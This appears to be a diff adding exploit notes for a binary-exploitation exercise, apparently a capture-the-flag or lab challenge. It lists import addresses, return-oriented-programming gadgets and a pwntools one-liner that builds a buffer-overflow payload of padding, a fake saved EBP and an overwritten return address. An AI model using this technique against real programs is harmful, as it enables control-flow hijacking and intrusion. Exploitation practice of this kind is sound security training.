@@ -1,0 +1,23 @@
+
+============ INFO ==========
+LoadLibraryA = 0x00402004
+GetProcAddress = 0x00402000
+User32.dll string = 0x00402110
+MessageBoxA string = 0x00402104
+
+============ GADGETS =========
+0x00401535 : pop edi ; pop esi ; ret
+0x00401029 : push 0 ; call eax
+0x00401737 : push ecx ; ret
+0x00401337 : mov eax, ecx ; ret
+0x004015b1 : mov eax, edx ; pop ebp ; ret
+0x004016ab : mov eax, edx ; ret
+0x00401168 : pop ecx ; ret
+0x0040102b : call eax
+
+============ PLAN ============
+plan: jump to 0x401000
+
+============= EXPLOIT ==========
+python -c "from pwn import *;print 'A'*0x20 + 'X'*4 + p32(0x0401000)" > input.txt
+                                    padding     ebp     ret 
